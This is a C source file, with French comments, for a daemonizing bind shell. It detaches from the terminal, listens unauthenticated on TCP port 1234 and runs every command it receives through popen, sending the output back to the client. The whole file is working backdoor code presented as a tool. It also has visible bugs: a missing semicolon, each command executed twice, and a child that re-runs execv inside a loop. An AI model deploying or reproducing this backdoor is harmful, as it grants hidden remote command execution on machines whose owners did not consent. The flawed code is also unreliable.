#include <sys/stat.h>  // umask()
#include <syslog.h>  // syslog()
#include <netdb.h>  // AF_INET, SOCK_STREAM, SOCKADDR_IN ect....

#include <stdio.h>
#include <string.h>
#include <stdlib.h>     /** EXIT_SUCCESS; **/
#include <errno.h>      /** perror **/
#include <unistd.h>

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket(s) close (s)

typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;

#define ERROR(expression)   printf("ERROR : %s\nError Number : %d\nError Message : %s\n", expression, errno, strerror(errno));


void daemonize(pid_t fils);

int main(int argc, char*argv[])
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    SOCKET csock = 0;
    SOCKADDR_IN csin;
    socklen_t crecsize = sizeof(csin);

    pid_t fils = 0;;
    char *shell = NULL;

    FILE *pipe[2] = {NULL};

    char buffer[BUFSIZ]= "";
    char buffer_cmd[BUFSIZ] = "";

    int option = 1;
    int ret = 0;
    unsigned int data_len = 0;

    char Msg[] = "Hey ! Iam HAL the server, you are now connected.\r\n";
    int msg_len = strlen(Msg);

    printf("[+] The server is open and ready.\n[+] Waiting for the openning of the remote shell.\n\n");

    daemonize(fils);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
        ERROR("socket()");
        exit(-1);
    }

    sin.sin_addr.s_addr   = INADDR_ANY;
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(1234);
    memset(sin.sin_zero, 0, 8);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (char*)&option, sizeof(option)) == SOCKET_ERROR)
    {
        ERROR("setsockopt()");
        exit(-1);
    }

    if(bind(sock, (SOCKADDR*)&sin, recsize) == SOCKET_ERROR)
    {
        ERROR("bind()");
        exit(-1);
    }

    if(listen(sock, 5) == SOCKET_ERROR)
    {
        ERROR("listen()");
        exit(-1);
    }

    csock = accept(sock, (SOCKADDR*)&sin, &crecsize);
    if(csock == INVALID_SOCKET)
    {
        ERROR("accept()");
        exit(-1);
    }

    ret = send(csock, (char*)&msg_len, sizeof(msg_len), 0);
    if(ret < 0)
    {
        ERROR("send() msg_len");
        exit(-1);
    }

    ret = send(csock, Msg, strlen(Msg) - 1, 0);
    if(ret < 0)
    {
        ERROR("send() msg");
        exit(-1);
    }

    fils = fork();
    if(fils < 0)
    {
        ERROR("fork fils()");
        exit(-1);
    }

    for(;;)
    {
        if(fils == 0)
        {
            printf("On est dans le fils");

            /*Recuperation du chemin relatif du shell grace a la var d'environnelment SHELL */

            shell = getenv("SHELL");

            if(shell == NULL)
            {
                ERROR("getenv()");
                exit(-1);
            }

            if(execv(shell, &argv[0]) == -1)
                ERROR("execv()");
        }

        else /*père*/
        {
            /*On vide notre buffer en le remplissant de 0*/
            memset (buffer, 0, BUFSIZ);

            /*on receptionne la commande*/
            ret = recv (csock, buffer, BUFSIZ, 0);
            if (ret < 0)
            {
                ERROR("recv cmd()");
                exit(-1);
            }

            if(strcmp(buffer, "quit") == 0)
            {
                shutdown(csock, 2);
                memset(buffer, 0, BUFSIZ);
                memset(buffer_cmd, 0, BUFSIZ);
                exit(0);
            }

            buffer[BUFSIZ-1] = '\0';

            pipe[0] = popen(buffer, "w");
            if(pipe[0] == NULL)
                ERROR("popen() pipe write data");

            /*envoi des résultats */
            pipe[1] = popen(buffer, "r");
            if(pipe[1] == NULL)
                ERROR("popen() pipe write data");

            ret = fread(buffer_cmd, sizeof(char), BUFSIZ, pipe[1]);
            if(ret <= 0)
                ERROR("fread()");

            data_len = strlen(buffer_cmd);

            if(send(csock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
                ERROR("send() data_len");

            if(send(csock, buffer_cmd, BUFSIZ, 0) == SOCKET_ERROR)
                    ERROR("send() results");

            memset(buffer, 0, BUFSIZ);
            memset(buffer_cmd, 0, BUFSIZ);
        }
    }

    return EXIT_SUCCESS;
}


void daemonize(pid_t fils)
{
    fils = fork();

    /* Si fork() echoue on quit directe */
    if(fils < 0)
    {        syslog(LOG_ERR, "fork() fils : %d : %s", errno, strerror(errno));
        exit(-1);
    }

    /* Si fork() réussit on stop le père */
    if(fils > 0)
        exit(EXIT_SUCCESS);

    /* On change de repertoire et se place a la racine */
    if(chdir("/") < 0)
    {
        syslog(LOG_ERR, "chdir() : %d : %s", errno, strerror(errno));
        exit(-1);
    }

    /* cf man et google sur pourquoi 0, basiquement aucun droit sur les fichier/dossier crées */
    umask(0);


    /*  Redirect standard I/O for cancel all user terminal messages **/
    if( freopen("/dev/null", "r", stdin) == NULL )
        ERROR("freopen() stdin");

    if( freopen("/dev/null", "w", stdout) == NULL )
        ERROR("freopen() stdout");

    if( freopen("/dev/null", "w", stderr) == NULL )
        ERROR("freopen stderr")
}

